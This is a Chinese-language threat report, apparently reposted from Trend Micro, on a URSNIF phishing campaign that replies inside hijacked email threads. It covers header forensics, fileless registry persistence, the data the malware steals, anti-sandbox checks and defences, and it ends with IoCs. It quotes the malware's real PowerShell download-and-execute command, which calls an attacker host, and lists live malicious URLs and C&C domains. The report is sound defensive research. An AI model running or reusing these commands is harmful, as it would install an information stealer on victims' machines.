+    同时在亚洲和拉丁美洲地区也发现了类似的攻击。
+   
+    本次恶意活动的主要目标是教育、金融和能源行业。然而，此次恶意活动还影响到了其他行业，包括房地产、交通运输、制造业和政府。
+    
+    捕获样本
+   
+    趋势科技发现了该恶意活动的一个示例，并对电子邮件的内容进行了截图，如下所示：
+    
+       
+  
+      
+      
+Figure 1. Example of a malicious email that is used to reply to a conversation
+      
+    
+    
+    由于发件人是一位熟悉的人，并且邮件也是往来对话中的一部分，因此作为收件人，很容易会相信这只是对此前邮件内容的另一封回复邮件。此外，该回复的标题和语法似乎都是正确的，甚至在电子邮件的末尾还附带了签名
+    。
+    当然，如果仔细检查，会发现这封电子邮件中存在一些可疑的地方。最明显之处在于，使用的语言从法语变成了英语。此外，恶意电子邮件中的签名与合法电子邮件的签名是不同的。最后还有一点，就是该邮件的内容是通用的，所以可能会偏离原来的交流内容。尽管不能通过这些因素，直接判断出这封邮件是恶意的，但至少能够提起警惕。然而，如果不经仔细阅读，这些小细节可能难以发现，特别是那些每天有大量邮件往来的人。
+    
+       
+  
+      
+      
+Figure 2. Comparison between the malicious email and a legitimate one. Note the difference in language and the changed signature
+      
+    
+    
+    擦亮眼睛！分析电子邮件头部信息
+   
+    在对电子邮件的头部信息进行检查后，发现了该攻击的一些有趣之处。
+    
+       
+  
+      
+      
+Figure 3. The anonymized email header of the malicious message (click the image to zoom in)
+      
+    
+    ⚠️ 在这里， 
+    有3个地方需要注意
+    ：
+    1、通常，恶意邮件都会伪造发件人，会使用 “Return-Path” 或 “Reply-To” 的 SMTP 头部，以便收件人能够将邮件直接回复给恶意攻击者。而在观察到的示例中，没有这两个头部信息，并且所有回复都会发送至发件人（也就是被攻陷的邮箱账户）。这就说明攻击者可能已经通过了发件人邮箱的身份验证。
+    2、“In-Reply-To”头部（或其他类似的 SMTP 头部字段）表示这封邮件是对已有电子邮件通信的回复。
+    3、这封电子邮件的第一跳（The First Hop）来自于 “rrcs-50–74–218–2[.]nyc[.]biz[.]rr[.]com”，这个地址对于家庭用户来说并不常见。对于组织用户来说，除非邮件是来自远程的服务，否则邮件都应该是从组织内部的服务器发送（例如：一个“  sender.co.ca  ”域内的主机）。
+    考虑到这些因素，可以看出这封电子邮件是从美国发出的。而根据示例中发件人邮箱的域名 .ca，这封邮件应该是发自加拿大。
+    经过进一步的调查，发现该域名在2018年9月期间使用了多个电子邮件地址，发送了大量不同的电子邮件。
+    攻击者经常会将附件的文件名与发件人的组织名称相对应，这样就有可能使得邮件看起来更加真实。附件文件名的格式通常是[发件人所在组织]+[与此前通信相关的一个动词，例如“查询”或“请求”].doc，或者就是简单的 [发件人所在组织].doc。这样的附件，使这封邮件不容易被人怀疑。在部分恶意活动中，我们看到附件使用了通用的文件名，例如“查询”、“声明”和“请求”。
+    根据邮件的标题，可以假定，攻击者通过某种方式获得了真实的邮箱账户，并且将该邮箱账户用于类似 BEC 的骗局之中。考虑到其运作方式和使用的技术，怀疑这一新的恶意邮件活动是 URSNIF/GOZI 恶意邮件活动的一部分。发送方的IP地址，可能是僵尸网络中被感染的主机之一。
+    
+    对 Payload 的分析
+   
+    一旦用户双击电子邮件中的恶意.doc附件，就会调用 PowerShell 从 C&amp;C 服务器下载最新版本的 URSNIF（检测为 TSPY_URSNIF.THAOOCAH）恶意软件：
+    
+      
+     powershell $VWc=new-object Net.WebClient;$wIt=’http: //t95dfesc2mo5jr. com/RTT/opanskot.php?l=targa2.tkn’.Split(‘@’);$jzK = ‘369’;$Aiz=$env:public+’\’+$jzK+’.exe’;foreach($fqd in $wIt){try{$VWc.DownloadFile($fqd, $Aiz);Invoke-Item $Aiz;break;}catch{}}
+    
+    
+    该文件是恶意软件的主要加载程序。但是， 
+    在执行其例程之前，它首先会检查操作系统版本，只允许在 Microsoft 操作系统上执行，特别是 Windows Vista 及以上版本。此外，它会避免在某些语言环境中运行，例如 CN（中国）和 RU（俄罗斯）
+    。
+    主加载器负责管理整个执行过程，并将事件记录在文本文件中：
+    
+      %User Temp%\{temp filename}.bin
+    
+    
+       
+  
+      
+      
+Figure 4. Logs of the malware’s loader (click the image to zoom in)
+      
+    
+    它会从 C&amp;C 服务器下载其他模块，并将它们保存在注册表文件夹 HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–15700F2219A4中。
+    下图展示了创建的注册表项，以及包含脚本和二进制文件的条目。
+    
+       
+  
+      
+      
+Figure 5. The registry key and entries containing scripts and binaries
+      
+    
+    请注意，尽管这些键和部分注册表项的名称在不同计算机上不尽相同，但其位置始终位于 HKCU\Software\AppDataLow\Software\Microsoft\。
+    在下载组件后，会执行存储在 comsxRes（此名称可能会发生变化）中的 PowerShell 脚本。下面的命令行指令展示了如何调用注册表中的十六进制值。
+    
+      exe /C powershell invoke-expression([System.Text.Encoding]::ASCII.GetString((get-itemproperty ‘HKCU:\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–7C9D-AB0E-15700F2219A4’).comsxRes
+    
+    
+       
+  
+      
+      
+Figure 6. Hex values of comsxRes
+      
+    
+    当此脚本加载存储在注册表中的嵌入式二进制文件时，无文件执行就开始了。在下图中，用–{hex-encoded binary} — 替换了二进制数据，从而能展现出全部代码。原始脚本的最底部部分也是使用了 Base64 编码，对其进行了解码，以保证可读性。
+    
+       
+  
+      
+      
+Figure 7. Code of the embedded binary that is stored in the registry
+      
+    
+    恶意程序会在创建的注册表项中搜索 Client32/Client64，并将该代码注入到 explorer.exe 以保证可以持续保留在内存中。注册表中的其他条目在后续例程运行过程中是必不可少的，因为这些条目会被注入的恶意软件代码所引用。例如，“TorClient” 条目指定了恶意软件如何通过 Tor 网络与其 C&amp;C 服务器通信。
+    
+    五、分析信息窃取例程
+   
+    最终的 Payload 是一个名为 Client32 或 Client64 的 DLL 文件，具体取决于主机的体系架构。它也如同大多数恶意软件的组件一样，存储在注册表中。 
+    最终 Payload 的主要目标是进行信息窃取，其中包括以下信息：
+   
+    · 系统信息
+    · 已安装的应用程序列表
+    · 已安装的驱动程序列表
+    · 正在运行的进程列表
+    · 网络设备列表
+    · 外网IP地址
+    · 电子邮件凭据（IMAP、POP3、SMTP）
+    · Cookie
+    · 证书
+    · 屏幕视频捕获（AVI 格式）
+    · 通过网页劫持获得的财务相关信息
+    
+    BSS 段加密
+   
+    在趋势科技所分析的所有 URSNIF 二进制文件中，都包含这个加密部分。在这一部分中，包含着将在代码中使用的所有相关字符串，并且仅会在恶意程序运行时解密。因此无法对字符串进行分析，也无法进行反编译，使得整个分析过程更为复杂。
+    
+    恶意软件的反分析机制
+   
+    为了防止研究人员通过沙箱获取到服务器和配置等信息，URSNIF 会在运行时两次检查光标的位置。如果光标位置不发生变化，那么就说明该恶意软件可能正在沙箱中进行分析，或是正在通过调试器进行分析。反分析的检查将在BSS部分被解密之前完成。如果发现存在问题，那么就会导致该恶意程序进入无限循环，并产生乱码字符串。
+    根据在这次攻击中所看到的情况，似乎攻击者正在不断对他们的网络钓鱼攻击方式进行更新，并探索更能有效迷惑用户的方法。这些网络攻击者不再满足于常规的钓鱼邮件，而是将他们的攻击巧妙的整合到正在进行的对话中，这就使得普通用户难以发现。这样的升级，其实正是攻击者和安全人员之间永无止境的猫捉老鼠游戏中的一部分。
+    
+    防范方法
+   
+    由于网络钓鱼攻击依赖于社会工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户。由此提醒大家， 
+    应该尽可能通过双因素身份认证（2FA）来保护自己的网络账户
+    。此外，作为组织，还应该考虑将双因素身份认证集成到系统之中，并且为组织中的成员提供可靠的认证。
+    ⚠️ 此外， 
+    要防范网络钓鱼，还应注意以下几点
+    ：
+    
+      组织中的所有用户都应具备足够的安全意识，了解网络钓鱼攻击的概念、网络钓鱼攻击的常见手段和识别可疑电子邮件的方法。
+      遇到任何可疑的请求时，都应进一步与相关人员进行核实，特别是在进行金融交易之前，务必要谨慎操作。
+      避免打开任何建议修改 Word 中安全配置的文档，这样的文档很有可能是恶意文件。
+      留意邮件中所有可疑之处，包括是否符合对话的上下文、是否使用了你们常用的语言、是否使用的是常用的邮件签名。
+    
+    
+    使用可管理的检测与响应服务（MDR）
+   
+    随着网络钓鱼攻击方式的日益复杂，组织内部的IT团队和安全团队可能难以监控网络和各个终端是否存在被攻击的迹象。尽管提升员工的安全意识有助于防范威胁，但如果要让员工识别精心伪造的电子邮件，还是具有一定的难度。
+    针对没有安全运营中心（SOC）的组织而言，就面临这一个双重挑战，因为一般的 IT 团队往往缺乏进行威胁研究和分析的经验。针对这些组织，建议采用第三方安全厂商的“可管理的检测与响应服务”（  MDR  ），从而帮助抵御高级威胁。Mdr 可以为攻击中的各种环境指标提供一个基线，并且使用这些指标作为安全分析的基础。
+    
+    IoC
+   
+    
+    Word文件的哈希值
+   
+    检测为TROJ_FRS.VSN0BI18 / Trojan.W97M.POWLOAD.SMY：
+    
+      bdd3f03fb074c55cf46d91963313966ce26afdb13b1444258f8f9e7e723d8395
+      dd7b4fc4d5cc1c1e25c800d5622423725a1b29000f93b658a54e267bbbe6f528
+      4df47982fdd1ac336625600fa8c947d45909248309b117d05fc532a2260c7bc4
+    
+    检测为Trojan.W97M.POWLOAD.FGAIBT：
+    
+      f88ef62f2342f4d1105cfe85395b735efd3f0308b79551944983ce245d425510
+      567fe3794a9eec27697ae0634861d284279261880887f60a7374c6cbe63b7674
+    
+    检测为Trojan.W97M.POWLOAD.NSFGAIBF：
+    
+      52d3ece98b6b3b686925156c3d62d8ce133fe3326e11b4c981c251452e4a41d2
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT：
+    
+      4d0762a6b2879d2fa821716db76bc980fdb3b8507611d2853df58c0d4127f9ea
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT2：
+    
+      47e2c66ba16e3ffa9704a13f2c00670319bf292b3d2aa7deede5442da02181e5
+      c2c946f7fd63fc15048a9af4043686f5a56b169e74cb36892fb8d1563b810467
+    
+    检测为Trojan.W97M.POWLOAD.SMTHF3：
+    
+      21ce42a1fc6631ed10db3d0e44b4ccb6d96a729fc494bd86a57cf07ff72cb8f2
+    
+    检测为Trojan.W97M.POWLOAD.SMY：
+    
+      de8f8f39259992886da3b07635cbf121027379e5c1a156a32c6c6e5ace3cc4c3
+      6b387b8534da9cc7cf0af4f2fb8c2a92f9316c0ea6ffb9cfe49b09b4c3df9778
+      6bf99f4b17a07e788219333d96a7a19c9eddc1b49d16c2a21da255a6a16c80d5
+      33d078881456e3b930c480803902fa28142b17c8550f3932e7cf4a1df0eb9213
+      6ca2d4dcea456b9d4c87f211ed20bb32f71a0c78ee8059b934162e643d66e0c9
+      82bee0c249b63f349d212a36f0b9ad90f909017ac734eac133353a1135d7474d
+      1f2e12a58cc23f4e6e7f17b8c1a5c50b88614fda103577354b9564f2dffc257f
+    
+    检测为W2KM_POWLOAD.FGAIBT：
+    
+      1db71aec64d0e391a8c99f4f6ee214962a281733643ace0874cf69e2843f448c
+    
+    检测为W2KM_POWLOAD.NSFGAIBF：
+    
+      c33d642da477f65c11daa9e8098b9917c4c5a6f131dd1369a20cb1b14c4cc261
+      398e677290b1db00d8751c3498847ad9c7d10721630175d2506c4d45af19d229
+      813a08d3b2216c89d42e8225c6de760d785905d1c76bd7428201d68c3c368f65
+    
+    检测为W2KM_POWLOAD.THIACAH：
+    
+      5aed7d6a3e8692143e53f9556cd3aa371149c96b91c02d1c659cb58d88572e47
+    
+    
+    下载的URSNIF
+   
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      0a38d92775cfc7182076d9a21c4937149ea8be6ebf22b9530afbca57d69c0d46
+    
+    
+    可执行文件Payload
+   
+    检测为TrojanSpy.Win32.URSNIF.BAIEF：
+    
+      358bd52ac46755b1c6fa73805a7a355450f85f4bcf1b2e798a04960743390422
+    
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      e8633f2f2b6b0b8f7348b4660e325ab25b87ec8faa40fb49eb0215b31bd276aa
+    
+    检测为TSPY_URSNIF.BAIEB：
+    
+      f92ba10fe245c00575ae8031d4c721fe0ebb0820a4f45f3bbce02654a6e7f18d
+    
+    
+    下载URL
+   
+    
+      hxxp://t95dfesc2mo5jr[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://enduuyyhgeetyasd[.]com/RTT/opanskot[.]php?l=omg8[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb1[.]tkn
+      hxxp://yrtw1djmj6eth7[.]com/RTT/opanskot[.]php?l=okb7[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr7[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://e3u1oz4an1dqmj[.]com/RTT/opanskot[.]php?l=okb9[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr3[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb5[.]tkn
+      hxxp://hbhbasdqweb[.]com/YUY/huonasdh[.]php?l=rgr4[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+    
+    
+    C&amp;C 服务器
+   
+    
+      app[.]kartop[.]at
+      doc[.]dicin[.]at
+      doc[.]avitoon[.]at
+      app[.]avitoon[.]at
+      ops[.]twidix[.]at
+      xx[.]go10og[.]at
+      api[.]kartop[.]at
+      m1[.]fofon[.]at
+      cdn[.]kartop[.]at
+      api[.]tylron[.]at
+      chat[.]twidix[.]at
+      api[.]kaonok[.]at
+      chat[.]jimden[.]at
+      mahono[.]cn
+    
+    趋势科技 XGen™安全性提供跨代混合的威胁防御技术，以保护系统免受各种类型的威胁，包括勒索软件和加密货币挖掘恶意软件。在网关和端点上具有高保真的机器学习功能，可以保护物理、虚拟和云工作负载。借助 Web / URL 过滤，行为分析和自定义沙盒等功能，XGen 安全可以抵御当今绕过传统控制的威胁，利用已知、未知或未公开的漏洞，窃取或加密个人身份数据、或进行恶意加密货币挖掘的威胁。◾️
+    
+    
+      
+         共享此文章： 
+        
+          
+                点击以在 Twitter 上共享（在新窗口中打开）  
+                点击以在 Facebook 上共享（在新窗口中打开）  
+            
+          
+        
+      
+    
+    
+       赞过： 
+      
+  赞    正在加载…… 
+      
+   
+   
+    
+    
+       
+     相关
+     
+    
+  
+  
+    
+      Tagged
+       phishing 
+       Security 
+       selfcare 
+       Technology 
+       URSNIF 
+    
+  
+  
+    
+
+    Published
+           2018年10月30日 
+       2019年8月10日 
+    
+  
+
+&tags=觀點2" class="ssk ssk-tumblr"></a>
+    <a href="https://buffer.com/add?text=渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort&url=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/" class="ssk ssk-buffer"></a>
+</div>
+
+
+    <div id="main" role="main" class="container">
+      
+  <!-- Html Elements for Search -->
+  <ul id="results-container" class="searched" style="color: #2980B9;"></ul>
+
+  <script src="/oped2/assets/js/simple-jekyll-search.min.js"></script>
+
+  <!-- Configuration -->
+  <script>
+  SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('results-container'),
+    json: '/oped2/search.json',
+    searchResultTemplate: '<li><a href="{url}" title="{desc}">{title}</a><time>{date}</time><a class="tag">{category}</a></li>',
+    noResultsText: '没找到',
+    limit: 100,
+    fuzzy: false,
+    exclude: ['Welcome']
+  })
+
+  </script>
+
+      
+
+
+
+
+
+
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
